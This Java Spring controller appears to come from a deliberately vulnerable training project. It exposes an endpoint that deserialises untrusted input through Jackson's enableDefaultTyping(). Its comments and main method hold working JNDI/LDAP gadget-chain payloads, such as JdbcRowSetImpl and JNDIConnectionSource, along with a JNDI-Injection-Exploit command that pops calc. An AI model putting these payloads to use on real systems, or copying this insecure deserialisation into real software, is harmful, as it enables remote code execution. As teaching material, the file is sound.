package com.madaha.codesecone.controller.AdvancedAttack.deserialize;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/jackson")
public class Jackson {

    /**
     * 在Jackson反序列化中，若调用了enableDefaultTyping()函数 或 使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。
     */
    @RequestMapping(value = "/vul", method = {RequestMethod.POST})
    public String vul(@RequestBody String content){

        // ["com.nqadmin.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":"true"}]
        // String payload = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\"}]";

        try {
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            // mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
            Object o = mapper.readValue(content, Object.class);
            mapper.writeValueAsString(o);

            // String s = mapper.writeValueAsString(o);    //快捷键来自动生成返回值接收变量：   Windows/Linux: Ctrl+Alt+V。
            // System.out.println(s);      //快捷键来快速打印System.out.println()语句;       输入sout，然后按下Tab键。

            return "Jackson RCE";
        } catch (Exception e){
            e.printStackTrace();
            return "Jackson RCE Exception...";
        }
    }


    /**
     * fastjson 使用范例：
     * url：
     **/










    /**
     * 参考：CVE-2020-35490
     * com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool组件库存在不安全的反序列化
     */
    public static void main(String[] args) throws Exception{
        // java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "127.0.0.1"

        /**
         * JdbcRowSetImpl反序列化：
         *      ["com.nqadmin.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":"true"}]
         *
         *      CVE-2017-7525（基于TemplatesImpl利用链）
         *          存在版本限制问题，jdk1.7我没有测试，但是jdk1.8弹不出来。
         *
         *
         * 环境限制参考：
         *      https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/
         *      https://fynch3r.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/# 6.1. 前提条件
         */
        // String payload ="[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\"}]";

        /**
         * JNDIConnectionSource反序列化：
         *      ["com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://127.0.0.1:1389/mg93jk"}]
         *      jdk1.8可以弹calc，但是需要依赖 com.newrelic.agent.java 组件才能成功弹。
         *
         * 环境限制参考：
         *      https://www.anquanke.com/post/id/227943
         */
        String payload = "[\"com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:1389/x1ega2\"}]";

        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object obj = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(obj);
    }
}
